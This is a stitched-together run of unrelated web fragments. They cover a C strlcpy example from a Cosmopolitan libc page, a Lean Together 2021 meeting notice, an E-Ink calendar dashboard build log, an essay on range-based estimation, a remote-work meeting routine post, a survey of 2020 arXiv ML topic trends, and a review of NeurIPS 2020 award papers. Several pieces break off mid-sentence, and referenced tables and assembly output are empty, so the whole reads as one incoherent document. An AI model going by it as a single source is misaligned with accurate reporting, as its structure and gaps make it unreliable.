<span>size_t</span> strlcpy(<span>char</span> *d, <span>const</span> <span>char</span> *s, <span>size_t</span> n) {
  <span>size_t</span> slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = <span>'\0'</span>;
  }
  <span>return</span> slen;
}
</pre>

<p>
  If we compile our <code>strlcpy</code> function, then here's the
  assembly code that the compiler outputs:

</p><table><tbody><tr><td>
<pre><span>/ compiled with traditional libc</span>

</pre>
</td></tr></tbody></table>

<p>
  That's a huge improvement in generated code size. The above two
  compiles used the same gcc flags and no changes to the code needed to
  be made. All that changed was we used cosmopolitan.h (instead of the
  platform c library string.h) which contains ABI specialization macros
  for <code>memcpy</code> and <code>strlen</code>. It's a great example
  of how merely choosing a better C library can systemically eliminate
  bloat throughout your entire codebase.

<p>Virtually via Zoom: <strong>4—7 Jan 2021</strong></p>

<h2 id="description">Description</h2>

<p>Lean Together is an annual meeting for users, developers, and fans of the
<a href="https://leanprover.github.io/">Lean proof assistant</a>
and its library <a href="https://leanprover-community.github.io/">mathlib</a>.
At this meeting we discuss ongoing projects in formalized mathematics and software verification,
as well as infrastructure and outreach for Lean and its community.
We welcome speakers and participants from other proof assistant communities,
as well as people who are inexperienced with proof assistants but want to learn more.</p>

<p>This year, due to world events, the meeting will be virtual.
The event is open to everyone without cost: feel free to attend as many
sessions as you’d like.</p>

<h2 id="format">Format</h2>

<p>The meeting will be held via Zoom, in a number of sessions spread out over the week of January 4.
We will vary the starting times of the sessions to accommodate people in different time zones.</p>

<p>We will have a mix of shorter talks about work in progress,
longer talks about more mature projects,
and some open discussion/planning sessions.
We will also have social time on <a href="https://www.wonder.me/">wonder.me</a> before and after the sessions.</p>

<p>More detailed scheduling information will appear in the following weeks.</p>

<p>With the speakers’ permission, talks will be recorded and posted to the
<a href="https://www.youtube.com/channel/UCWe5B7Ikr0AI9727doEUxPg">leanprover community YouTube channel</a>.</p>

<p>Having worked from home for the better part of the year, I recently started to work on a new project. Building a E-Ink based dashboard which would keep track of my meetings among other things. Given the always-on nature of the E-Ink display, this would help me better manage by schedule during a typical work-day especially given I tend to miss Google Calendar notifications <em>a lot</em>. </p>
<p>This is what the end result looks like:</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_end_result.jpg" alt="Top View" title="E-Ink Dashboard" width="640px">
</p>
<p>The app here is showing the next 5 Calendar events for <strong>a demo Google account</strong>.<br>
Looks nice and simple, does it not ?</p>
<h4 id="the-hardware">The Hardware</h4>
<p>I took an off-the-shelf approach for the hardware. I purchased an <a href="https://inkplate.io/">InkPlate 6</a> which was originally crowd-funded on <a href="https://www.crowdsupply.com/e-radionica/inkplate-6">CrowdSupply</a>.</p>
<p>The E-Ink display is from a recycled Kindle e-reader, which means its a pretty great display. It has 2 modes including a 2-bit per pixel gray-scale mode and monochrome. It supports partial updates in monochrome mode. The display is connected to a <code>ESP 32</code>, with built-in WiFi. All we need to do is to hookup the display to a PC via a USB cable and power it on. The display also comes with a nice 3D printed enclosure. </p>
<h4 id="the-software">The Software</h4>
<p>The InkPlate 6 supports MicroPython, and recently the libraries powering the display were <a href="https://github.com/e-radionicacom/Inkplate-6-micropython">opensourced</a>. This gave me a decent foundation to build on top-of.</p>
<h5 id="oauth2-support">OAuth2 support</h5>
<p>The first step to showing events from Google Calendar is to be able to complete an <code>OAuth2</code> flow. I decided to use the <a href="https://developers.google.com/identity/protocols/oauth2/limited-input-device">device flow</a> given the limited input capabilities of the ESP 32. </p>
<p>MicroPython does not have any libraries that work with <code>OAuth2</code>, so I decided to write one. Here is the <a href="https://github.com/micropython/micropython-lib/pull/407">PR</a> that I eventually made to the <a href="https://github.com/micropython/micropython-lib">micropython-lib</a> GitHub repo which adds support for this specification. This ended up being pretty straightforward, given my familiarity with OAuth2 (having authored <a href="https://github.com/openid/AppAuth-JS">this</a> library before).</p>
<h5 id="building-a-limited-ui-toolkit">Building a limited UI-Toolkit</h5>
<p>The <code>InkPlate</code> has a decent <a href="https://github.com/e-radionicacom/Inkplate-6-micropython/blob/master/gfx.py">Graphics</a> API, but rather than having to hard-code coordinates to render UI i decided to take minor detour and build a mini UI Toolkit from first principles based on the graphics primitives that were supported. I took a lot of inspiration from the <em>existing</em> Android UI View system and build a small subset of those APIs.</p>
<h6 id="measuring-text">Measuring text</h6>
<p>The first step was to be able to measure the text to be able to compute how much space <code>text</code> with a given <code>text size</code> would occupy on the screen. The <code>InkPlate</code> uses bitmap fonts, so i ended up using a look-up-table for widths and heights for individual letters for a given size. It's an approximation, but it worked well enough for me to proceed to the next step.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_1.jpg" alt="Top View" title="Step 1: Measuring text" width="640px">
</p>
<h6 id="columns-alignment-and-padding">Columns, Alignment and Padding</h6>
<p>Now that I had text measurements I could start drawing some text in <code>Columns</code> and <code>Rows</code> (these are the containers supported by the  custom layout system). I managed to also implement <code>padding</code> and text <code>alignments</code>. Not perfect, but still pretty good progress. </p>
<p>The image below consists of a single <code>Column</code> with a nested <code>Row</code> and a bunch of <code>Text</code> nodes in various alignments and sizes. The <code>10px</code> box on top is a component called <code>Spacer</code> which just occupies empty space on the screen.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_2.jpg" alt="Top View" title="Step 2: Columns, Padding &amp; Alignments" width="640px">
</p>
<h6 id="columnar-layouts-and-alignments">Columnar Layouts and alignments</h6>
<p>Now that I had some basic building blocks, I decided to go further and implement more complex layouts. I implemented support for <code>aligning</code> containers and fixed a lot of bugs when nesting containers. You can also see <code>text alignments</code> within individual <code>Column</code> containers working.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_3.jpg" alt="Top View" title="Step 3: Columnar Layouts &amp; Nested Containers" width="640px">
</p>
<h6 id="supporting-images">Supporting Images</h6>
<p>I finally added support for <code>Image</code> nodes to layouts. This is also when I started to add some much needed UI polish. </p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_4.jpg" alt="Top View" title="Step 4: Supporting Images &amp; Initial UI" width="640px">
</p>
<h6 id="miscellaneous-features">Miscellaneous Features</h6>
<p>I also worked on other additional features along the way, including:</p>
<ul>
<li>Support &amp; configuration for time zones. The MicroPython runtime on the ESP 32 does <em>not</em> ship with a Time Zone database and the real time clocks only support UTC seconds after epoch. </li>
<li>Support for token caching &amp; persistence. This was a big feature because this would mean that I could serialize the <code>auth state</code> on the device. This meant that I did not have to do the full <code>OAuth2</code> dance every single time I started the app.</li>
<li>A small <code>DateTime</code> library capable of formatting dates in a couple of different formats. </li>
<li>Support for <code>Deep Sleep</code>. This would allow the device to conserve power by not having to do anything. The device would only wake up once every <code>N</code> minutes to refresh the events in the <code>Calendar</code>. </li>
</ul>
<h4 id="summary">Summary</h4>
<p>This project was a <strong>lot of fun</strong>. I learnt a lot, especially given that I did not intend to build a UI Toolkit when I started working on the project). The toolkit i built is janky, but it is an accomplishment, considering I have never built one before. </p>
<p>MicroPython was incredible to prototype with (despite lacking a graphical debugger). I would highly recommending picking up a board that supports MicroPython for your next hardware project. The MicroPython community (libraries + forums) is also pretty active and helpful</p>
<h4 id="epilogue">Epilogue</h4>
<p>All the source code that I wrote for the project is on <a href="https://github.com/tikurahul/Inkplate-6-micropython">GitHub</a>. The entry point is a file called <a href="https://github.com/tikurahul/Inkplate-6-micropython/blob/master/app.py"> <code>app.py</code></a>. Bear in mind, that all of this code was written in ~ a week long period. I also plan on making some more minor improvements to the UI. </p>

<p>We’re constantly asked to give estimates:</p>



<p><em>How long will it take?<br>How much will it cost?</em><br><em>What time should we leave?</em><br><em>How much do you want?</em></p>



<p>Estimations are information about the unknown. We constantly use this information to make decisions: allocating resources, changing strategies, and choosing partners. But despite all this practice, we’re horrible at accurate estimations.</p>



<h2>Why Estimations are Hard</h2>



<p>Estimations are hard for both technical and social reasons.</p>



<p>We don’t know what we don’t know. Naive estimators fail to account for surprises. They estimate based on known factors and best-case scenarios. These estimates may be <em>perfectly accurate</em> beforehand, but they’re instantly broken by the first surprise.</p>



<p>Experienced estimators account for this problem by ‘adding some buffer’. But even then, how much should they add? Even knowing that surprises <em>can</em> happen, it’s impossible to <em>how many</em> will happen or <em>the impact</em> of those surprises. Choosing the right amount of buffer is a lot like making the right estimation in the first place. We still don’t know what we don’t know. And adding too much buffer can be as expensive as failing to account for surprise at all.</p>



<p>In addition to this technical problem, there’s a strong social problem. Let’s imagine two common scenarios.</p>



<p>In the first scenario, you just gave  giving an estimate to your team. You perfectly estimate that a project will take three weeks; but your manager gives you a puzzled look. Your teammate snickers, claiming they could do it in a week, tops. The feeling is that you must be either lazy or incompetent to give such a padded estimation. You newly shortened estimate is wrong, so you go on to extend the project’s deadline twice in three weeks. Rather than holding you accountable to that one-week estimate, your manager commends you for being able to handle the unforeseen surprises on such a complicated project.</p>



<p>In the other scenario, you’re giving an estimate to a potential client. You perfectly estimate that a project will take three weeks; but your competitor only estimates it’ll take a week. The client signs with your competitor. Since their estimate was wrong, your competitor goes on to extend the deadline twice in three weeks. Even though your estimate was accurate, your client’s estimate got them paid.</p>



<p>I’ve been in countless scenarios like this. Sometimes people outright pressure us into shortening our estimations, and sometimes the voice in our heads push us to. Either way, giving accurate estimates is both technically hard and socially challenging [1].</p>



<h2>Two Types of Estimators</h2>



<p>In response to this hard problem, we become systematic underestimators or systematic overestimators.</p>



<p>Underestimators fail to give enough buffer. This strategy has two key benefits. First, it signals (unrealistically) high performance. Like our virtue-signalling teammate, we can underestimate ahead of time, then point at concrete surprises for our eventual underperformance. And like our overpromising competitor, we can underestimate during a bid and do whatever we want after the contract is signed. Second, tight estimates demand efficiency. Underestimators set deadlines that they and their teams must work hard to meet. Underestimation works well when the costs of going over-budget are small. But when those costs are large, underestimations lead to disasters. On the whole, underestimators systematically run the risk of being burnt out, past-deadline, and over-budget.</p>



<p>Overestimators are instead biased towards large buffers. Extreme overestimators might send you articles titled “Estimations are a Scam”, or claim that estimations are simply tools for worker exploitation. Overestimation works when the costs of buffer are low and the costs of going over budget are high. But overestimators are constantly taxed by Parkinson’s Law. Parkinson’s Law is the pattern where projects fill the time and resources they’re allocated, instead of the time and resources they need [2]. Rather than pushing towards peak performance, overestimators systematically move at a bored, leisurely pace. Overestimators are also demotivating. Rather than inspiring the team to reach competitive goals, they disparage those who do. So while underestimators run the risk of their teams burning out, overestimators run the risk of their teams shutting down.</p>



<p>To simplify the hard problem of estimations, we slowly become under- or over-estimators. We reap the systematic rewards and accept the systematic costs. These chosen strategies may work in many contexts. But for any simple strategy, there are worst-case scenarios where those systematic risks blow up. Underestimators blow up when the costs of going over budget skyrocket. Overestimators blow up when the costs of adding extra buffer skyrocket.</p>



<p>This line between underestimators and overestimators forms a classic “spectrum problem”. A spectrum problem occurs when we oversimplify the solution to a given tradeoff. In this case, we’re splitting the spectrum of estimation strategies in half. Underestimators fall on one side of the line, and overestimators fall on the other. With many spectrum problems, the better solution is to cut the spectrum into three pieces, choosing the middle strategy between extremes. In doing so, we acknowledge the costs and rewards of both sides, maximizing the upsides and minimizing the downsides systematically.</p>



<h2>Playing Single-Pointed Darts</h2>



<p>Imagine a game of darts with very simple rules. I throw my dart first, and you only score by hitting that same exact dart-sized point. This game is very simple, but so difficult that nobody would play it. To make darts playable, we specify scoring <em>ranges</em>. These same ranges are missing from our everyday estimations.</p>



<p>The most common estimate sounds something like: “I’ll have it ready by 5pm.” But this is just like playing single-point darts! Imagine that this estimate is perfectly precise: the project can’t be ready one second before or one second after 5pm. While impressive, there’s zero room for error. If we end up sick, or if the project ends up more complex than expected, our estimate becomes instantly wrong.</p>



<p>To account for surprises, we can add buffer. But adding buffer only shifts the dart board over a few inches. “I’ll have it ready by 5pm <em>tomorrow</em>” faces all the same problems as the first estimation. Two days of surprises still makes me wrong. We’re still playing single-pointed darts.</p>



<p>It’s a losing game. And yet we see it played again and again, day after day, project after project.</p>



<h2>Playing Darts with Ranges</h2>



<p>To enjoy this game of darts, we need to change the rules. Rather than giving a single-pointed estimate, we give two points: one for the best case, and one for the worst case. These two points create a range of targets to hit, just like the game of darts we know and love.</p>



<p>To demonstrate, I can give an example from my personal life. My girlfriend is very punctual, and I’m not. She’s a classic overestimator, giving as much buffer as we can afford. And I’m a classic underestimator, giving the most optimistic estimates. So whenever we have somewhere to be, and she asks me “what time should we be ready?”… it’s a classic estimation problem!</p>



<p>My preference would be to underestimate, and tell her the last minute we can leave without being late. Her preference would be for me to overestimate, telling her the soonest we can leave without being “too early”. But no matter what I say, we face all of the same problems stated above.</p>



<p>Recently, I’ve started giving her two answers. The first answer is “the green time”. <strong>The green time tells us when we should leave so that we’re pleasantly early</strong>. The second answer is “the red time”. <strong>The red time is the last minute we can leave, without definitely being late</strong>. If we can be ready by the green time without stress or shortcuts, that’s perfect. Once we pass the green time, we go into the “yellow zone.” <strong>The yellow zone is the buffer between early and late</strong>. There’s no need to take shortcuts or change plans yet, but we’re getting close. Once we approach the red line, we start discussing the need to take shortcuts, or to start telling others that we may be a little late.</p>



<p>Having a green time, a yellow zone, and a red time transforms our game of single-pointed darts into a proper dartboard, with zones of success. The green time makes my girlfriend happy: she can be ready early without worry. The red time makes me happy: I can fill my buffer time up with other activities. And the yellow zone is a signal for both of us to get focused or to start taking shortcuts [3].</p>



<p>Aside from the technical benefits, I can <em>feel</em> the difference in enjoyment between playing single-pointed darts vs playing scoring-ranged darts. Having a range makes inherent uncertainty explicit to the group. Adding buffer doesn’t just shift the dartboard a few inches, it expands our range of accuracy. Larger buffers signal more uncertainty and require less precision, while smaller buffers signal more confidence and require more precision. The expression of certainty and confidence isn’t possible to communicate with a single-pointed estimate.</p>



<p>By estimating with two numbers instead of one, a richness of information and strategies are made available.</p>



<h2>Simple Changes</h2>



<p>Using two numbers instead of one, these so-called “confidence intervals” aren’t complicated. Then why are they so absent from everyday life?</p>



<p>Although nothing prevented us from discovering them earlier, the first mention of confidence intervals in scientific literature wasn’t until 1937. And it wasn’t until the 1980s that they were required in scientific journals. So if it took forty years for the most knowledgeable people to apply a simple solution towards the most urgent problems, it’s not surprising that it’s taken the rest of us at least as long. That said, the goal of this essay is to speed up that process.</p>



<p>We can move towards accurate estimations by practicing two …</p></div></article></div>

Psychologically and emotionally, it’s easy to feel disconnected and lonely when you don’t see people outside your household for weeks and months on end. And this presents some unique challenges for maintaining culture and productivity, and keeping morale up in general.</p><p><strong>The Challenge</strong></p><p>When the pandemic hit in March and everyone in the world started working remotely, we were worried about how to keep people connected and plugged in. We had to adapt quickly to keep communication flowing and make sure that everyone felt connected and a part of the community that we somewhat lost when everyone stopped going into the office.</p><p>We developed a solution that has worked really well for us, and I’d like to share it. I hope you find it useful, but I’d love to hear if you’ve found other things that work as well.</p><p><strong>The Solution: Monday Morning</strong></p><p>Immediately after switching to full remote work, we switched up the cadence of company meetings. We went from an all hands once a month to two in the same week.</p><p>Every Monday morning at 9:30 we get everyone together (via Zoom) to kick off the week with a company-wide coffee hour.</p><figure><img width="1024" height="577" src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-768x433.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1536x865.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2048x1154.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1200x676.png 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/image-1024x577.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/image-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/image-768x433.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1536x865.png 1536w, https://jasonkolb.com/wp-content/uploads/2020/12/image-2048x1154.png 2048w, https://jasonkolb.com/wp-content/uploads/2020/12/image-1200x676.png 1200w"><figcaption>Mmm, a cup of coffee together is a great way to kick off the week!</figcaption></figure><p>In this meeting we go team-by-team over what we accomplished last week and our goals are for this week.

Everyone knows what’s happening around the company, including in all of the other teams. Everyone seems to like it, and there are some interesting byproducts:</p><ul><li>Our short-term goal setting has gotten much better. Goals are set on a weekly basis, which has resulted in more accountability and velocity. Teams are looking at goals on a shorter time horizon now, which leads to more tangible outcomes every week.</li><li>Wins and losses come at the end of each and every week, which is very motivating if the team hits their goals, or if the team doesn’t hit their goals. Either way, the entire company sees it.</li><li>We’ve become much better at estimating how long it will take to do something. If you’re bad at estimating it can completely destroy morale and trust, this shorter-term focus has made the act of slicing up work into achievable chunks much more efficient.</li></ul><p><strong>The Solution: Friday Afternoon</strong></p><p>On Friday afternoon there are two more things we do every single week.</p><p>At 1pm, after the leadership team updates the Monday morning deck, we meet as a group to review everyone’s updates together, ask questions, and talk about challenges. Some of the best discussions and collaboration happen during this meeting, and this is the main place and time where cross-team dependencies are often discovered and planned around. We also talk about wins, challenges, and collect shout-outs for people who have done outstanding work over the past week.</p><p>Then at 4:30pm, before everyone takes off for the weekend, we wrap up the week with our Friday Afternoon Happy Hour:</p><figure><img width="1024" height="576" src="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png" alt="" srcset="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-768x432.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1200x675.png 1200w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png" data-srcset="https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1024x576.png 1024w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-300x169.png 300w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-768x432.png 768w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour-1200x675.png 1200w, https://jasonkolb.com/wp-content/uploads/2020/12/friday-happy-hour.png 1255w"><figcaption>Not everyone drinks at happy hour, but we do keep it happy!</figcaption></figure><p>We try to keep happy hour fun and lighthearted. We celebrate wins, give shout-outs to people who did something extraordinary over the course of the week, and show the company any fun or funny things that happened during the course of the week. We try to leave some room for people to talk and have fun as well (we’ve had some GREAT Zoom backgrounds!), but generally we try to send people into the weekend on a high note.</p><p><strong>Summary</strong></p><p>These meetings have become routine for us now, and pretty much our entire company loves them. Our communication is better, teamwork is tighter, goal-setting is more accurate, and velocity is way higher.</p><p>Honestly I would have a hard time *not* having these meetings now. They’ve worked *so well* to create a tighter company all around that I don’t know that any set of in-person meetings could really replicate, let alone surpass, the results.</p><p>This may not work for everyone, but it works great for us, and I hope that at the very least this sparks some ideas for making your company more efficient and maintaining your culture during this–or any future–challenge to working together.</p></div></div></div>]]>

                    <!--kg-card-begin: markdown--><p>The progress of the machine learning (ML) and artificial intelligence fields never stopped surprising us this year either. In natural language processing (NLP), new, powerful models such as GPT-3 and T5 are published one after another. The Transformer found its way into the computer vision (CV) field as well (<a href="https://cdn.openai.com/papers/Generative_Pretraining_from_Pixels_V2.pdf">Chen et al. 2020</a>, <a href="https://arxiv.org/abs/2010.11929">Dosovitskiy et al. 2020</a>). The exponential growth trend of the number of papers published on arXiv and at conferences hasn't slowed down yet.</p>
<p>In this post, I'm going to use NLP techniques to analyze all the ML/NLP/CV papers published on arXiv this year and summarize the "most frequently mentioned ML topics in 2020." These top-ranked keywords represent the ML trends in 2020 very well, and knowing them in advance will make your job easier when it comes to reading more scientific articles (this is very important for non-native English speakers like me!)</p>
<p>Specifically, I collected the titles and abstracts of all the papers published on arXiv in 2020 via the arXiv API, and extracted named entities with a model trained on SciREX. The SciREX model can extract typed named entities such as tasks, metrics, datasets, and methods, which enables us to rank the mentions per type. The technical details of the analyses are shown in the "technical details" section at the bottom of this article.</p>
<h2 id="mostfrequentlymentionedtopicsin2020pertype">Most Frequently Mentioned Topics in 2020 (per Type)</h2>
<p>I only focus on the three AI fields—general machine learning (<a href="https://arxiv.org/list/cs.LG/recent">cs.LG</a>), natural language processing (<a href="https://arxiv.org/list/cs.CL/recent">cs.CL</a>), and computer vision (<a href="https://arxiv.org/list/cs.CV/recent">cs.CV</a>). I'm aware that there are many other AI/ML categories on arXiv, although I limited to just three to simplify things.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="machinelearningcslg">Machine Learning (cs.LG)</h3>

<p>If you look at the list of datasets, most of them are related to computer vision, which is arguably the most actively researched area in machine learning.</p>
<p>As for the methods, you see neural networks everywhere. Among generic methods such as "neural network" and "deep learning" you also see "graph neural network," which is one of the biggest recent trends in ML.</p>

<p>This was obvious in retrospect, but the most mentioned topic in NLP was "COVID-19." A dataset of COVID-related papers <a href="https://allenai.org/data/cord-19">CORD-19</a> was published. An information extraction shared task was held at the <a href="http://noisy-text.github.io/2020/">W-NUT 2020</a> workshop. A lot of research efforts were made for analyzing COVID-related information on social media as well as on clinical text. It is also nice to see many authors <a href="https://thegradient.pub/the-benderrule-on-naming-the-languages-we-study-and-why-it-matters/">name the language(s)</a> they work on in the abstract.</p>
<p>Top-mentioned methods are all related to BERT, language models, and transformers. I wonder when the <a href="https://ruder.io/nlp-imagenet/">"ImageNet Moment"</a> with transformer-based transfer learning is going to peak out in NLP.</p>

<p>Among the "regulars" such as CIFER-10/100, ImageNet, and MNIST, COVID-19 and chest x-ray are in the most mentioned dataset list. There has been a lot of research work on, for example, diagnosis of COVID-19 from chest x-ray images.</p>
<p>The most mentioned task was (semantic) segmentation, which is an important CV task with a wide range of applications such as autonomous driving and medical image processing.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="topicsontherisein2020">Topics on the Rise in 2020</h2>
<p>In the second half of this article, we are going to dive into some trends of individual fields by comparing the number of mentions between 2019 and 2020 and focusing on mentions that have significantly more (or fewer) mentions.</p>
<h3 id="machinelearningcslg">Machine Learning (cs.LG)</h3>
<p>First, let's look at the mention trends in machine learning. The following table lists the 20 most mentioned topics in 2020 (regardless of their types)  along with their monthly trends (relative number of papers that mention each keyword) in the past 24 months. If a topic has statistically significantly more mentions compared to the expected value based on the 2-year average, the trend is shown in green; red if it's significantly fewer.</p>

<p>On the other hand, COVID-19 and graph neural networks are on the rise, as discussed above. The entire field of NLP seems to be on the rise as well, thanks to the continued interests in methods such as transformers and BERT.</p>

<!--kg-card-end: html--><!--kg-card-begin: markdown--><p>BERT, language models, and transformers are among the "hottest" methods in recent years, and their mentions are on the rise in 2020 too. The significantly larger number of "downstream tasks" mentions is most likely due to the continued interests in transfer learning.</p>
<p>On the flip side, "machine translation," "neural machine translation," and "BLEU score" were not mentioned as much. This does not mean these translation-related topics are not important, but does mean that the NLP trends have shifted to pretrained language models after the the "Transformer shock" in 2017 had subsided.</p>
<p>Other mentions that increased significantly in 2020 include "pretrain models," "fine-tuning," and "RoBERTa." The mentions of RoBERTa had increased 6-fold in 2020 compared to the previous year, cementing its position as the baseline pretrained model after BERT.</p>

				<div><p><span>This was one hard, very hard year for all of us</span><span>.&nbsp;It was a year in which pandemic reshaped our world. It seems that this trend is going to go continue further in 2021. The field of AI, however, was not impacted that much by all these changes. At least not in a negative way. A steady flow of research papers was not stopped, in fact, we saw some quite amazing breakthroughs. That is why, for the last article of 2020, we decided to write about </span><strong>awarded </strong><span>research </span><strong>papers </strong><span>from </span><strong>Neural Information Processing Systems</strong><span> (</span><em>NeurIPS</em><span>) conference.</span></p>
<p><span> Looking at the old logo of </span><em>NeurIPS&nbsp;</em><span>conference, my wife asked me “What is that? Is that a witchcraft conference?”. Close, but no, it is one of the most </span><strong>important</strong><span> machine learning conferences. In fact, </span><span>the&nbsp;</span><em>NeurIPS </em><span>awards are something like the </span><em>Oscars </em><span>in the world of machine learning. Every year a bunch of papers is proposed to and the best papers are awarded. This was the thirty-fourth&nbsp;</span><em>NeurIPS </em><span>conference and it was held online. Interesting thing is that this years’ conference had the biggest number of </span><strong>submissions </strong><span>ever. This year 38% more papers were accepted than the last, which is 1,903 as compared to 2019’s 1,428. This says a lot about the state of the machine learning industry.&nbsp;</span></p></div>

<p>From a huge number of submitted papers and 1903 accepted papers – 3 were awarded. This year winning papes are:</p>

<ul>
<li>Language Models are Few-Shot Learners</li>
<li>No-Regret Learning Dynamics for Extensive-Form Correlated Equilibrium</li>
<li>Improved Guarantees and a Multiple-Descent Curve for Column Subset Selection and the Nystrom Method</li>
</ul>

<p>The <em>NeurIPS </em>committee was guided by several <strong>criteria</strong>. The best paper has to be revolutionary, creative and have a certain elegance, but it has feasible, realistic and reproducible as well. It also shouldn’t be over complicated and inefficient. In our opinion committee have done an awesome job 🙂</p>

<p>It is would be a small thing to say that GPT-3 blew us all away this year. We already see so many applications that are utilizing the concepts presented in this paper. In general, we may say that GPT-3 was the biggest disruption we saw this year, so there is no wonder why this paper won at this year’s conference. The background of this fascinating paper, released by researchers from Open AI, lies in the fact that transfer learning is becoming dominant in <strong>NLP</strong>. Meaning that the industry is heavily using models that are pre-trained on a large corpus of text and then fine-tune them on a specific task.</p>
<p><strong>Fine-tuning</strong> itself can be time-consuming. On the other hand, humans can perform a new language task from only a few examples, which is something that NLP models are trying to achieve (even though they are still far away from it). In order to improve that and generate more t<strong>ask agnostic</strong> solution, OpenAI trained <strong>GPT-3</strong> model with <strong>175 billion parameters</strong> and tested its performance without any fine-tuning. As expected, they achieve some amazing results. Just for comparison, last year’s GPT-2 had 1.5 billion parameters and this month Microsoft introduced (until now) the largest Transform based language model that had 17 billion parameters. So, yes, GPT-3 is a huge autoregressive model trained with unsupervised learning and few-shot learning.</p>

				<p>Architecturally speaking, there are no changes from the <strong>GPT-2</strong> model. All the nitty-gritty details like modified initialization, pre-normalization and reversible tokenization are the same. The only <strong>difference</strong> is that that this time authors used alternating dense and locally banded sparse attention patterns in the layers of the transformer. Also, this large GPT-3 model was not the only model that is trained for the purposes of this paper. There are <strong>8 models</strong>, with parameters variating from 125 million to 175 billion parameters:</p>

				<p>In this table, we can also see the sizes of the batches used for model training. These models are trained on following <strong>datasets</strong>:</p>
			</div> <!-- .et_pb_text --><p><span><img src="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?w=1080&amp;ssl=1" alt="" title="datasetsgpt3" srcset="https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?w=480&amp;ssl=1 480w, https://i0.wp.com/rubikscode.net/wp-content/uploads/2020/05/datasetsgpt3.jpg?resize=300%2C88&amp;ssl=1 300w" sizes="(max-width: 480px) 100vw, 480px" data-recalc-dims="1"></span>
			</p><div>
				
				
				<p>The results from all the categories are mindblowing. For example, for traditional language modeling tasks, GPT-3 sets a new <strong>SOTA</strong> on the <em>Penn Tree Bank</em> dataset by a margin of 15 points based on zero-shot perplexity. GPT-3 showed amazing results in <em>question answering</em> tests. In general, these tests are separated into open-book and closed-book tests. Due to the number of possible queries, open-book tests use an information retrieval system to find relevant text and then the model learns to generate the answer from the question and retrieved text. Closed-book tests don’t have this retrieval system.</p>

				<div><p>GPT-3 <strong>achieved</strong> 64.3% in the zero-shot setting, 68.0% in the one-shot setting, and 71.2% in the few-shot setting closed-book tests on the <em>TriviaQA</em> dataset. It <strong>outperformed</strong> fine-tuned <em>T5-11B</em> by 14.2% in a zero-shot setting. Note that <em>T5-11B</em> is finetuned, while <em>GPT-3</em> is not. It is interesting that on translation tasks, GPT-3 also sets new <strong>SOTA</strong> when it comes to translation into English. It outperforms previous unsupervised <em>NMT</em> work by 5 BLEU. For the other tasks, like Winograd-Style Tasks, Common Sense Reasoning and Reading Comprehension, GPT-3 also proved it’s superiority. Read more in the paper about it.</p>
<p>Since GPT-3 was focused on task-agnostic performance, it was not fine-tuned. This means that there is a lot more room for <strong>improvement</strong> and that we will see some results in that field rather soon.</p></div>

				<div><p>The NeurIPS commitie comment:</p>
<blockquote>
<p><em>Language models form the backbone of modern techniques for solving a range of problems in natural language processing. The paper shows that when such language models are scaled up to an unprecedented number of parameters, the language model itself can be used as a few-shot learner that achieves very competitive performance on many of these problems without any additional training. This is a very surprising result that is expected to have substantial impact in the field, and that is likely to withstand the test of time. In addition to the scientific contribution of the work, the paper also presents a very extensive and thoughtful exposition of the broader impact of the work, which may serve as an example to the NeurIPS community on how to think about the real-world impact of the research performed by the community.</em></p>

			</div> <!-- .et_pb_text --><div>
				
				
				<p>This paper addresses the problem related to game theory, computer science, and even economics. To me more specific it starts from the <strong>Nash equilibrium</strong> theory. Nash equilibrium is a concept where the <strong>optimal</strong> outcome of a game is one where no player has a motivation to deviate from her strategy after considering an opponent’s choice. For example, let’s consider two players <em>P1</em> and <em>P2</em> which choose strategies <em>S1</em> and <em>S2</em>. The set of strategies <em>(S1, S2)</em> is a Nash equilibrium if <em>P1</em> doesn’t have other strategies that provide a better payoff than <em>S1</em> in response to <em>P2</em> choosing <em>S2</em>. On the other hand, <em>P2</em> has no other strategy that does better than <em>P2</em> at maximizing her payoff in response to <em>P1</em> choosing <em>S1</em>.</p>

